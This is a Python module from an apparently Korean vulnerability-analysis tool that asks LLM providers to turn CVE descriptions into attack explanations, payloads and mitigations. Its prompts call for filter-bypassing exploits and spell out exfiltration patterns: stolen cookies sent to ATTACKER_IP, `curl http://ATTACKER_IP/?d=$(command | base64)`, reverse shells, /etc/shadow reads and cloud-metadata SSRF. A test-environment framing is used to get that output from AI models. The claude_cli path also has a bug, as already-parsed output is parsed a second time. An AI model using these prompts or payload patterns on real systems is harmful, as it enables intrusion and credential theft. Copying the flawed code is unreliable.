"""AI-powered CVE analysis — produces attack method / payload example / mitigation.

Dynamically loads the configured provider, model, and API key from ``app_settings``
(the singleton row managed by the settings API) instead of env vars, so the user
can configure credentials at runtime via the UI without a redeploy.

Both OpenAI and Anthropic are supported. Each provider call returns the same
``AiAnalysis`` shape; the caller doesn't need to care which backend was used.
"""
from __future__ import annotations

import asyncio
import json
import shutil
from dataclasses import dataclass

import httpx
from fastapi import HTTPException, status
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.logging import get_logger
from app.models import AiCredential, AppSettings, Vulnerability

log = get_logger(__name__)

_TIMEOUT = httpx.Timeout(60.0, connect=10.0)

_SYSTEM_PROMPT = (
    "당신은 침투 테스트와 취약점 연구 경험이 풍부한 보안 엔지니어입니다. "
    "주어진 CVE에 대해 공격 원리를 설명하고, 직접 실행 가능한 PoC 페이로드를 작성한 뒤, "
    "그 페이로드가 어떻게 차단·무력화되는지 1:1로 매핑되는 패치 방안을 제시합니다. "
    "mitigation 항목은 '방금 작성한 그 페이로드'를 정확히 어떻게 막는지 설명해야 합니다 — "
    "일반적인 '업데이트하세요' 식 조언은 금지입니다. "
    "CVE 설명에 드러나지 않은 사실을 추정한 경우 '추정:' 접두사로 명시하세요. "
    "모든 답변은 한국어(존댓말)이며, 반드시 지정된 JSON 스키마만 반환합니다."
)

_USER_TEMPLATE = (
    "다음 CVE를 분석해 주세요. 실무자가 이 결과만 보고도 공격 재현과 패치 구현이 가능해야 합니다.\n\n"
    "CVE ID: {cve_id}\n"
    "제목: {title}\n"
    "설명:\n{description}\n\n"
    "JSON 필드 작성 규칙입니다.\n\n"
    "attack_method (문자열, 한 단락):\n"
    "  다음 4가지를 순서대로 포함하세요.\n"
    "  (1) 취약한 컴포넌트와 버전 범위, 기본 설정에서 노출되는지 여부\n"
    "  (2) 공격 전제조건 — 인증 필요 여부, 네트워크 위치, 활성화돼야 하는 기능/설정\n"
    "  (3) 실제 트리거 경로 — 어떤 엔드포인트·파라미터·파일 형식·함수 호출이 어떤 내부 로직의 어떤 결함을 건드리는지\n"
    "  (4) 성공 시 영향 — 획득 권한과 후속 피벗 가능성\n"
    "  '악성 페이로드 전송', '취약점을 악용하여' 같은 추상적 표현 금지. 취약한 코드 경로가 무엇을 잘못 처리하는지까지 설명.\n\n"
    "payload_example (문자열, 본인 소유 테스트 환경에서 즉시 결과를 확인할 수 있는 실전 PoC):\n"
    "  중요: 범용·교과서 예시 금지. 이 CVE에만 해당하는 구체적 exploit을 작성하세요.\n"
    "  반드시 지킬 것:\n"
    "    1) CVE 설명·제목에 등장한 취약 컴포넌트의 실제 엔드포인트·파라미터·함수명·파일 경로·헤더명을 그대로 사용. 일반화하지 말 것.\n"
    "    2) 단순 존재 증명(alert(1), 그냥 ' OR 1=1-- 같은 1줄 PoC)이 아니라, 취약 컴포넌트의 기본 필터·처리 로직을 실제로 뚫는 형태.\n"
    "    3) 실제 영향을 회수하는 메커니즘 포함:\n"
    "       - XSS → document.cookie·localStorage·CSRF 토큰을 ATTACKER_IP로 fetch/이미지 비콘 전송\n"
    "       - SQLi → UNION 또는 boolean/time-based 기반으로 DB 버전·사용자·해시를 뽑아내는 구체 쿼리\n"
    "       - 명령 인젝션 → `curl http://ATTACKER_IP/?d=$(명령 | base64)` 형태로 결과 외부 회수 또는 리버스 셸\n"
    "       - 경로 순회 → /etc/shadow, /proc/self/environ, 애플리케이션 설정·시크릿 등 구체적 민감 파일까지\n"
    "       - SSRF → 클라우드 메타데이터(AWS 169.254.169.254, GCP metadata.google.internal) 또는 내부 관리 엔드포인트\n"
    "       - 역직렬화/템플릿 인젝션 → 실제로 원격 명령까지 이어지는 gadget chain 또는 템플릿 payload\n"
    "       - 인증 없이 HTTP로 트리거되는 RCE → curl 또는 HTTP 원문 한 세트로 명령 실행 + 결과 회수까지\n"
    "    4) payload 내에 '# 핵심: ...' 주석으로 '이 토큰·이 인코딩·이 헤더가 어떤 필터/검사를 왜 우회하는지' 최소 1회 지적.\n"
    "  취약점 유형별 payload 본체 형식:\n"
    "    - XSS/HTML 인젝션 → 주입될 HTML/JS 본체만 (curl 래퍼 금지)\n"
    "    - SQL 인젝션·명령 인젝션·경로 순회·템플릿 인젝션 → 주입되는 문자열만\n"
    "    - SSRF → URL 한 줄\n"
    "    - HTTP로 직접 트리거되는 RCE/인증우회 → curl 또는 HTTP 원문, 여러 줄로\n"
    "    - 메모리 손상/바이너리 → 최소한의 python PoC\n"
    "  주석 규칙:\n"
    "    - 주석이 허용되는 형식이면 첫 줄 '# 용도: ...', 마지막 줄 '# 확인 포인트: ...'를 별도 줄로 추가.\n"
    "    - 주석을 지원하지 않는 순수 문자열 형태라면 페이로드 본체만 작성.\n"
    "    - '# 확인 포인트'에는 외부 수신 로그 내용, 응답에 포함될 구체적 문자열/코드, 소요 시간 등 성공 판별 기준을 적습니다.\n"
    "  여러 줄 페이로드는 JSON 문자열 내 실제 개행(\\n)으로 구분하고, 한 줄로 압축하지 마세요.\n"
    "  ATTACKER_IP, TARGET_HOST, SESSION_COOKIE 같은 대문자 플레이스홀더만 사용 (실제 IP·도메인 하드코딩 금지). "
    "본인이 소유·운영하는 테스트 환경 또는 의도적으로 취약하게 구성된 실습 환경에서 사용하는 것을 전제로 작성합니다.\n\n"
    "mitigation (문자열 배열, 3~6개 항목, 우선순위 높은 순):\n"
    "  매우 중요: 각 항목은 위에서 작성한 payload_example 자체가 어떻게 실패하게 되는지를 설명해야 합니다. "
    "  '이 페이로드의 OO 부분이 OO 검사에 걸려 차단됨'처럼 payload의 구체적 요소를 인용하세요.\n"
    "  각 항목 형식: '[분류] 적용 위치·방법 — 이 패치가 적용됐을 때 위 payload의 어느 부분이 왜 실패하는지'\n"
    "  분류는 다음 중 선택: 코드패치 / 설정변경 / 입력검증 / WAF·네트워크 / 버전업그레이드\n"
    "  - 코드패치: 가능한 경우 수정 전/후 코드 스니펫(짧게)이나 함수명·파일 위치 수준의 구체성\n"
    "  - 입력검증: 어떤 정규식·화이트리스트·정규화 처리가 payload의 어느 토큰을 거르는지\n"
    "  - WAF·네트워크: payload의 어떤 문자열을 매칭해서 차단하는지(ModSecurity 규칙 예시 등)\n"
    "  - 버전업그레이드: 수정 버전 번호와, 그 버전에서 payload의 트리거 경로가 어떻게 변경됐는지\n"
    "  payload와 무관한 일반 조언(로그 모니터링, 최소 권한 등)은 포함하지 마세요."
)

_JSON_SCHEMA = {
    "type": "object",
    "additionalProperties": False,
    "required": ["attack_method", "payload_example", "mitigation"],
    "properties": {
        "attack_method": {"type": "string"},
        "payload_example": {"type": "string"},
        "mitigation": {
            "type": "array",
            "items": {"type": "string"},
            "minItems": 1,
        },
    },
}

# Providers that speak the OpenAI Chat Completions wire format. Any
# credential with one of these provider values goes through ``_call_openai``;
# the only thing that differs is the base URL (stored on the credential).
_OPENAI_COMPATIBLE = {"openai", "gemini", "groq", "openrouter", "cerebras"}

# Providers whose OpenAI-compatible endpoint is known to accept the full
# ``json_schema`` strict response_format. Others fall back to ``json_object``
# which is far more widely supported; the prompt already tells the model
# exactly which fields to emit.
_SUPPORTS_JSON_SCHEMA = {"openai", "gemini"}


def _build_response_format(provider: str) -> dict:
    if provider in _SUPPORTS_JSON_SCHEMA:
        return {
            "type": "json_schema",
            "json_schema": {
                "name": "cve_analysis",
                "strict": True,
                "schema": _JSON_SCHEMA,
            },
        }
    return {"type": "json_object"}


@dataclass
class AiAnalysis:
    attack_method: str
    payload_example: str
    mitigation: list[str]


class AiAnalyzerNotConfigured(HTTPException):
    def __init__(self, detail: str) -> None:
        super().__init__(status_code=status.HTTP_400_BAD_REQUEST, detail=detail)


async def _load_active_credential(db: AsyncSession) -> AiCredential:
    settings_row = (
        await db.execute(select(AppSettings).where(AppSettings.id == 1))
    ).scalar_one_or_none()
    if settings_row is None or settings_row.active_credential_id is None:
        raise AiAnalyzerNotConfigured(
            "활성화된 AI 키가 없습니다. 설정 페이지에서 키를 등록하고 사용할 키를 선택하세요.",
        )
    cred = (
        await db.execute(
            select(AiCredential).where(AiCredential.id == settings_row.active_credential_id)
        )
    ).scalar_one_or_none()
    if cred is None:
        raise AiAnalyzerNotConfigured(
            "선택한 AI 키를 찾을 수 없습니다. 설정 페이지에서 다시 선택해주세요.",
        )
    # claude_cli uses the host's Claude Code login, not an API key.
    if (cred.provider or "").lower() != "claude_cli" and not cred.api_key:
        raise AiAnalyzerNotConfigured(
            "선택한 자격 증명에 API 키가 비어 있습니다. 설정 페이지에서 확인해주세요.",
        )
    if not cred.provider:
        raise AiAnalyzerNotConfigured("AI 제공자가 설정되지 않았습니다.")
    if not cred.model:
        raise AiAnalyzerNotConfigured("AI 모델이 설정되지 않았습니다.")
    return cred


def _parse_payload(raw: str) -> AiAnalysis:
    """Accept either a raw JSON object or a JSON object wrapped in code fences."""
    text = raw.strip()
    if text.startswith("```"):
        text = text.strip("`")
        # Strip optional language hint like "json\n..."
        if "\n" in text:
            first, rest = text.split("\n", 1)
            if len(first) <= 10:  # crude heuristic
                text = rest
    try:
        data = json.loads(text)
    except json.JSONDecodeError as e:
        log.exception("ai_analyzer.parse_failed", raw=raw[:500])
        raise HTTPException(status_code=502, detail=f"AI 응답 파싱 실패: {e}") from e
    try:
        mitigation = data["mitigation"]
        if not isinstance(mitigation, list):
            raise ValueError("mitigation must be a list")
        return AiAnalysis(
            attack_method=str(data["attack_method"]).strip(),
            payload_example=str(data["payload_example"]).strip(),
            mitigation=[str(m).strip() for m in mitigation if str(m).strip()],
        )
    except (KeyError, ValueError, TypeError) as e:
        raise HTTPException(status_code=502, detail=f"AI 응답 스키마 불일치: {e}") from e


async def _call_openai_text(
    cred: AiCredential,
    system: str,
    user: str,
    *,
    force_json: bool,
) -> str:
    payload: dict = {
        "model": cred.model,
        "messages": [
            {"role": "system", "content": system},
            {"role": "user", "content": user},
        ],
    }
    if force_json:
        payload["response_format"] = _build_response_format(cred.provider)
    headers = {
        "Authorization": f"Bearer {cred.api_key}",
        "Content-Type": "application/json",
    }
    base = (cred.base_url or "https://api.openai.com/v1").rstrip("/")
    url = f"{base}/chat/completions"
    provider_label = cred.provider.capitalize()
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT) as client:
            res = await client.post(url, headers=headers, json=payload)
    except httpx.HTTPError as e:
        raise HTTPException(
            status_code=502,
            detail=f"{provider_label} 호출 실패 ({url}): {e}",
        ) from e
    if res.status_code >= 400:
        detail = _extract_error(res, provider_label)
        raise HTTPException(status_code=502, detail=detail)
    body = res.json()
    try:
        return body["choices"][0]["message"]["content"]
    except (KeyError, IndexError, TypeError) as e:
        raise HTTPException(
            status_code=502, detail=f"{provider_label} 응답 구조 오류: {e}"
        ) from e


async def _call_anthropic_text(cred: AiCredential, system: str, user: str) -> str:
    payload = {
        "model": cred.model,
        "max_tokens": 2048,
        "system": system,
        "messages": [{"role": "user", "content": user}],
    }
    headers = {
        "x-api-key": cred.api_key,
        "anthropic-version": "2023-06-01",
        "Content-Type": "application/json",
    }
    async with httpx.AsyncClient(timeout=_TIMEOUT) as client:
        res = await client.post(
            "https://api.anthropic.com/v1/messages",
            headers=headers,
            json=payload,
        )
    if res.status_code >= 400:
        detail = _extract_error(res, "Anthropic")
        raise HTTPException(status_code=502, detail=detail)
    body = res.json()
    try:
        chunks = [b.get("text", "") for b in body.get("content", []) if b.get("type") == "text"]
        content = "".join(chunks)
    except (KeyError, TypeError) as e:
        raise HTTPException(status_code=502, detail=f"Anthropic 응답 구조 오류: {e}") from e
    if not content:
        raise HTTPException(status_code=502, detail="Anthropic 응답에 텍스트가 없습니다.")
    return content


_CLI_SELF_UPGRADE_TRIED = False


async def _claude_cli_version() -> str:
    """Return ``claude --version`` first line, or 'unknown' on any failure."""
    try:
        proc = await asyncio.create_subprocess_exec(
            "claude", "--version",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
        return out.decode("utf-8", errors="replace").strip().splitlines()[0] or "unknown"
    except Exception:
        return "unknown"


async def _try_self_upgrade_claude_cli() -> tuple[bool, str]:
    """Best-effort one-shot ``npm install -g @anthropic-ai/claude-code@latest``.

    Container CLI is pinned to the npm version installed at image build time.
    Host CLI auto-updates and may write the auth file in a newer format the
    container CLI can't read — symptom is silent ``exit 0 + empty stdout``
    or 401 against a freshly-refreshed host token. Bumping the in-container
    CLI to latest at runtime recovers without rebuild.

    Idempotent across the worker process — only runs once per startup so a
    repeated client retry doesn't reinstall every call.
    """
    global _CLI_SELF_UPGRADE_TRIED
    if _CLI_SELF_UPGRADE_TRIED:
        return False, "이번 프로세스에서 이미 시도함"
    _CLI_SELF_UPGRADE_TRIED = True
    if shutil.which("npm") is None:
        return False, "npm 미설치 — INSTALL_CLAUDE_CLI=1 로 빌드된 이미지가 아닙니다."
    try:
        proc = await asyncio.create_subprocess_exec(
            "npm", "install", "-g", "@anthropic-ai/claude-code@latest",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        out_b, err_b = await asyncio.wait_for(proc.communicate(), timeout=180)
    except asyncio.TimeoutError:
        return False, "npm install 시간 초과 (180s) — 네트워크 확인 필요"
    except Exception as e:
        return False, f"npm install 예외: {e}"
    if proc.returncode != 0:
        diag = (err_b or out_b).decode("utf-8", errors="replace").strip()[:200]
        return False, f"npm install 실패 (exit={proc.returncode}): {diag}"
    return True, "npm install 성공"


async def _call_claude_cli_text(
    cred: AiCredential,
    system: str,
    user: str,
    *,
    _retried_after_upgrade: bool = False,
) -> str:
    """Invoke the local Claude Code CLI in headless mode.

    Uses the host's Claude Code authentication (mounted via ``~/.claude``),
    so the user's existing subscription is used instead of a separate
    Anthropic API key / billing. The CLI binary must be on PATH inside the
    backend container — see README section "AI 심층 분석 — Claude Code CLI".

    Failure-handling: any failure (non-zero exit OR exit 0 + empty stdout)
    triggers a one-shot in-container CLI self-upgrade and ONE retry. This
    transparently recovers from version drift between host CLI (which auto-
    updates and may write a newer auth-file format) and container CLI
    (pinned to image build time).
    """
    if shutil.which("claude") is None:
        raise HTTPException(
            status_code=502,
            detail=(
                "claude CLI를 찾을 수 없습니다. 백엔드 이미지에 Claude Code CLI가 "
                "설치되어 있어야 합니다. README의 'Claude Code CLI' 섹션을 참고하세요."
            ),
        )
    prompt = system + "\n\n" + user
    args = [
        "claude",
        "-p",
        prompt,
        "--model",
        cred.model,
        "--output-format",
        "text",
    ]
    try:
        proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
    except FileNotFoundError as e:
        raise HTTPException(
            status_code=502,
            detail="claude CLI 실행 실패: 바이너리를 찾을 수 없습니다.",
        ) from e
    try:
        stdout_bytes, stderr_bytes = await asyncio.wait_for(
            proc.communicate(), timeout=180
        )
    except asyncio.TimeoutError as e:
        proc.kill()
        raise HTTPException(
            status_code=504,
            detail="claude CLI 응답이 제한 시간(180초) 내에 돌아오지 않았습니다.",
        ) from e
    stdout_text = stdout_bytes.decode("utf-8", errors="replace").strip()
    stderr_text = stderr_bytes.decode("utf-8", errors="replace").strip()

    failed_exit = proc.returncode != 0
    failed_empty = (not failed_exit) and not stdout_text

    if (failed_exit or failed_empty) and not _retried_after_upgrade:
        prev_version = await _claude_cli_version()
        ok, msg = await _try_self_upgrade_claude_cli()
        if ok:
            new_version = await _claude_cli_version()
            log.info(
                "claude_cli.self_upgraded",
                prev_version=prev_version,
                new_version=new_version,
                trigger="exit_nonzero" if failed_exit else "empty_stdout",
            )
            return await _call_claude_cli_text(
                cred, system, user, _retried_after_upgrade=True
            )
        log.warning(
            "claude_cli.self_upgrade_skipped",
            reason=msg,
            cli_version=prev_version,
        )

    if failed_exit:
        # claude CLI는 인증/모델 오류 같은 사용자 메시지를 stdout으로 내보내는
        # 경우가 많아서, stdout과 stderr를 둘 다 합쳐 보여줘야 진단이 가능합니다.
        diag = (stderr_text or stdout_text or "(출력 없음)")[:600]
        raise HTTPException(
            status_code=502,
            detail=f"claude CLI 실행 실패 (exit={proc.returncode}). 오류: {diag}{_claude_cli_auth_hint(diag)}",
        )
    if failed_empty:
        # exit 0 + empty stdout 도 종종 CLI 버전 drift 또는 인증/구독 만료의
        # silent failure 모드. self-upgrade 가 못 고쳤다면 사용자에게 OAuth
        # 갱신 + 빌드 옵션을 다 알려준다.
        raise HTTPException(
            status_code=502,
            detail=f"claude CLI 응답이 비어 있습니다.{_claude_cli_auth_hint(stderr_text)}",
        )
    return _parse_payload(stdout_text)


def _claude_cli_auth_hint(diag: str) -> str:
    """Return a Korean hint when the CLI output looks auth/credential-shaped.

    Three failure modes need different fixes:

      * "not logged in" / "/login" → docker overlay (mount) missing.
      * 401 / invalid credentials / expired → host OAuth token expired
        OR (most common on macOS) host CLI now stores tokens in macOS
        Keychain instead of ``~/.claude/.credentials.json``. Container CLI
        (Linux) can't read Keychain so falls back to the stale legacy file.
        Workaround: run ``backend/scripts/sync_claude_creds_from_keychain.sh``
        on the host to mirror the Keychain token into ``.credentials.json``.
      * Unrecognised diag → no hint (avoid noise).
    """
    lower = diag.lower()
    if "hit your limit" in lower or "rate limit" in lower or "usage limit" in lower:
        return (
            " — Claude 구독 사용량 한도 도달. 한도 reset 시각 이후 재시도하거나 "
            "API key 방식의 다른 provider 로 일시 전환하세요. 인증 자체는 정상."
        )
    if "not logged in" in lower or "/login" in lower:
        return (
            " — 컨테이너 안의 claude CLI가 호스트 로그인을 보지 못합니다. "
            "docker compose에 `-f docker-compose.claude-cli.yml` 오버레이를 "
            "포함해 다시 띄웠는지 확인하세요."
        )
    if (
        "401" in lower
        or "invalid authentication" in lower
        or "authentication_error" in lower
        or "expired" in lower
        or "credentials" in lower
        or not diag  # empty stdout/stderr — assume silent auth degradation
    ):
        return (
            " — claude CLI 인증 실패. macOS 호스트라면 새 CLI 가 OAuth 를 "
            "Keychain('Claude Code-credentials') 에 저장해 컨테이너 mount 로 "
            "공유 안 됩니다. 호스트에서 "
            "`backend/scripts/sync_claude_creds_from_keychain.sh` 한 번 실행하면 "
            "Keychain → ~/.claude/.credentials.json 으로 동기화되고 컨테이너가 "
            "즉시 새 토큰을 읽습니다 (rebuild 불필요). Linux 호스트라면 토큰 "
            "만료일 가능성이 크니 호스트에서 `claude` 한 번 실행하거나 "
            "`claude /login` 으로 새 OAuth flow 를 진행하세요. 그래도 안 되면 "
            "API key 방식의 다른 provider 로 전환하세요."
        )
    return ""


def _extract_error(res: httpx.Response, provider: str) -> str:
    try:
        body = res.json()
        msg = body.get("error", {}).get("message") or body.get("message") or res.text
    except Exception:
        msg = res.text
    return f"{provider} API 오류 ({res.status_code}): {msg[:400]}"


async def _dispatch_text(
    cred: AiCredential,
    system: str,
    user: str,
    *,
    force_json: bool,
) -> str:
    provider = (cred.provider or "").lower()
    if provider in _OPENAI_COMPATIBLE:
        return await _call_openai_text(cred, system, user, force_json=force_json)
    if provider == "anthropic":
        return await _call_anthropic_text(cred, system, user)
    if provider == "claude_cli":
        return await _call_claude_cli_text(cred, system, user)
    raise AiAnalyzerNotConfigured(f"지원하지 않는 AI 제공자입니다: {cred.provider}")


async def call_llm(
    db: AsyncSession,
    system: str,
    user: str,
    *,
    force_json: bool = True,
) -> str:
    """Public LLM-call helper. Loads the active credential and returns raw text.

    Used by ai_analyzer.analyze_vulnerability and by the sandbox payload-
    adapter / result-analyzer — anything that needs a one-shot prompt
    against whatever provider the user has configured.
    """
    cred = await _load_active_credential(db)
    return await _dispatch_text(cred, system, user, force_json=force_json)


async def analyze_vulnerability(db: AsyncSession, vuln: Vulnerability) -> AiAnalysis:
    user_prompt = _USER_TEMPLATE.format(
        cve_id=vuln.cve_id,
        title=vuln.title,
        description=vuln.description,
    )
    raw = await call_llm(db, _SYSTEM_PROMPT, user_prompt, force_json=True)
    return _parse_payload(raw)
